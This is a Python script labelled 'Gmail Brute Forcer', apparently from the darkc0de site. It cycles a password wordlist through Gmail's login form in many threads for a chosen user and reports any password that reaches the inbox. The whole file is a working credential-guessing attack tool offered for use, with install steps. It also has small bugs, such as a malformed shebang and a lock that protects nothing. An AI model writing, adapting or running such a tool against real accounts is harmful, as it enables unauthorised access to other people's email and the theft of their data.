#!usr/bin/python
# Gmail Brute Forcer
# To use this script you need ClientCookie and Client Form.
# http://wwwsearch.sourceforge.net/ClientCookie/src/ClientCookie-1.0.3.tar.gz
# http://wwwsearch.sourceforge.net/ClientForm/src/ClientForm-0.1.17.tar.gz
#To install the package, run the following command:
#python setup.py build
#then (with appropriate permissions)
#python setup.py install

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading
import time
import random
import sys
import socket
import re

def Start(user_in,wordlist_in):
    user = user_in
    wordlist = wordlist_in
    try:
        sys.path.append('ClientCookie-1.0.3')
        import ClientCookie
        sys.path.append('ClientForm-0.1.17')
        import ClientForm
    except(ImportError):
        print('To use this script you need ClientCookie and Client Form.')
        print('Read the top intro for instructions.')
        sys.exit(1)
    from copy import copy

    try:
        words = open(wordlist_in, "r").readlines()
    except(IOError):
        print('Error: Check your wordlist path')
        sys.exit(1)

    print('Параметры:')
    print('[+] Server: https://www.gmail.com/')
    print('[+] User:',user_in)
    print('[+] Words Loaded:', len(words))

    wordlist = copy(words)


    def reloader():
        for word in wordlist:
            words.append(word)


    def getword():
        lock = threading.Lock()
        lock.acquire()
        if len(words) != 0:
            value = random.sample(words, 1)
            words.remove(value[0])
        else:
            print('Reloading Wordlist')
            reloader()
            value = random.sample(words, 1)

        lock.release()
        return value[0]


    class Worker(threading.Thread):
        def run(self):
            global success
            value = getword()
            try:
                print('-' * 12)
                print('User:', sys.argv[1], 'Password:', value)
                cookieJar = ClientCookie.CookieJar()
                opener = ClientCookie.build_opener(ClientCookie.HTTPCookieProcessor(cookieJar))
                opener.addheaders = [("User-agent", "Mozilla/5.0 (compatible)")]
                ClientCookie.install_opener(opener)
                fp = ClientCookie.urlopen("https://www.gmail.com/")
                forms = ClientForm.ParseResponse(fp)
                form = forms[0]
                form["Email"] = sys.argv[1]
                form["Passwd"] = value
                fp = ClientCookie.urlopen(form.click())
                site = fp.readlines()
                for line in site:
                    if re.search("Gmail - Inbox", line):
                        print('Successful Login:', value)
                        success = value
                        sys.exit(1)
                fp.close()
            except(socket.gaierror) as msg:
                pass


    for i in range(len(words)):
        work = Worker()
        work.start()
        time.sleep(1)
    time.sleep(3)
    try:
        if success:
            print('[+] Successful Login: https://www.gmail.com/')
            print('[+] User:', user_in, ' Password:', success)
    except(NameError):
        print('[+] Couldn\'t find correct password')
        pass
    print('[+] Done')
